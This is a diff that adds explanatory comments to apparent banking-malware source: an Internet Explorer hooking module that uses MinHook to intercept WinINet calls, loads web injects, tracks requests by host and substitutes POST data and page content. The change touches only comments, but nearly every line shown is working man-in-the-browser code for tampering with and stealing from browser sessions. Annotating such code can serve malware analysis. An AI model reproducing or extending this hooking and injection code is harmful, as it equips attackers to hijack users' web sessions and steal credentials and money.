@@ -22,8 +22,8 @@ struct Request
    AiList   *injects;
 };
 
-static Request          g_requests[MAX_REQUESTS] = { 0 };
-static CRITICAL_SECTION g_critSec;
+static Request          g_requests[MAX_REQUESTS] = { 0 };                            // keeps track of all requests being made
+static CRITICAL_SECTION g_critSec;                                                   // used to manage threads
 
 static BOOL (__stdcall *Real_InternetReadFile)(LPVOID hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
 static BOOL (__stdcall *Real_HttpSendRequestW)(LPVOID hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength);
@@ -38,7 +38,7 @@ static BOOL (__stdcall *Real_InternetWriteFile) (HINTERNET hFile, LPCVOID lpBuff
 static void AddRequest(PVOID hInternet, PCHAR host)
 {
    Funcs::pEnterCriticalSection(&g_critSec);
-   for(DWORD i = 0; i < MAX_REQUESTS; ++i)
+   for(DWORD i = 0; i < MAX_REQUESTS; ++i)                                           // searches for an empty request, adds a new one
    {
       if(!g_requests[i].hInternet)
       {
@@ -53,7 +53,7 @@ static void AddRequest(PVOID hInternet, PCHAR host)
 static void RemoveRequest(void* hInternet)
 {
    Funcs::pEnterCriticalSection(&g_critSec);
-   for(DWORD i = 0; i < MAX_REQUESTS; ++i)
+   for(DWORD i = 0; i < MAX_REQUESTS; ++i)                                           // searches for an appropriate request, removes it
    {
       if(g_requests[i].hInternet == hInternet)
       {
@@ -71,7 +71,7 @@ static void RemoveRequest(void* hInternet)
 static Request *GetRequest(void* hInternet)
 {
    Funcs::pEnterCriticalSection(&g_critSec);
-   for(DWORD i = 0; i < MAX_REQUESTS; ++i)
+   for(DWORD i = 0; i < MAX_REQUESTS; ++i)                                           // searches for the appropriate request, retrieves it
    {
       if(g_requests[i].hInternet == hInternet)
       {
@@ -85,8 +85,8 @@ static Request *GetRequest(void* hInternet)
 
 static BOOL __stdcall My_InternetWriteFile(HINTERNET hFile, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite, LPDWORD lpdwNumberOfBytesWritten)
 {
-   Request *request = GetRequest(hFile);
-   if(request)
+   Request *request = GetRequest(hFile);                                             // searches for the appropriate request
+   if(request)                                                                       // if there is such then substitutes for the actual data
    {
       if(request->post)
       {
@@ -96,13 +96,14 @@ static BOOL __stdcall My_InternetWriteFile(HINTERNET hFile, LPCVOID lpBuffer, DW
       }
    }
    return Real_InternetWriteFile(hFile, lpBuffer, dwNumberOfBytesToWrite, lpdwNumberOfBytesWritten);
-}
+}                                                                                    // writes the substituted data into cache (Temporary Internet Files)
 
 static BOOL __stdcall My_HttpSendRequestW(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength)
 {
    BOOL ret = Real_HttpSendRequestW(hRequest, lpszHeaders, dwHeadersLength, lpOptional, dwOptionalLength);
-   Request *request = GetRequest(hRequest);
-   if(request)
+                                                                                     // saves http request handle to hRequest
+   Request *request = GetRequest(hRequest);                                          // searches for a request with the same handle
+   if(request)                                                                       // if there is such then updates data in there
    {
       if(request->post)
       {
@@ -117,7 +118,8 @@ static BOOL __stdcall My_HttpSendRequestW(HINTERNET hRequest, LPCWSTR lpszHeader
 static HINTERNET __stdcall My_InternetConnectW(HINTERNET hInternet, LPCWSTR lpszServerName, INTERNET_PORT nServerPort, LPCWSTR lpszUserName, LPCWSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext)
 {
    HINTERNET Ret = Real_InternetConnectW(hInternet, lpszServerName, nServerPort, lpszUserName, lpszPassword, dwService, dwFlags, dwContext);
-   if(Ret)
+                                                                                     // opens http or ftp connection with lpszServerName, returns handle to the session
+   if(Ret)                                                                           // if session is established, adds a new request
    {
       char *host = Utf16toUtf8((wchar_t *) lpszServerName);
       AddRequest(Ret, host);
@@ -294,7 +296,7 @@ void HookIe()
 {
    MH_Initialize();
    LoadWebInjects();         
-   Funcs::pInitializeCriticalSection(&g_critSec);
+   Funcs::pInitializeCriticalSection(&g_critSec);                                    //
    MH_CreateHookApi(Strs::wWininet, Strs::ie4, My_InternetCloseHandle, (LPVOID *) &Real_InternetCloseHandle);
    MH_CreateHookApi(Strs::wWininet, Strs::ie5, My_InternetQueryDataAvailable, (LPVOID *) &Real_InternetQueryDataAvailable);
    MH_CreateHookApi(Strs::wWininet, Strs::ie6, My_HttpOpenRequestW, (LPVOID *) &Real_HttpOpenRequestW);
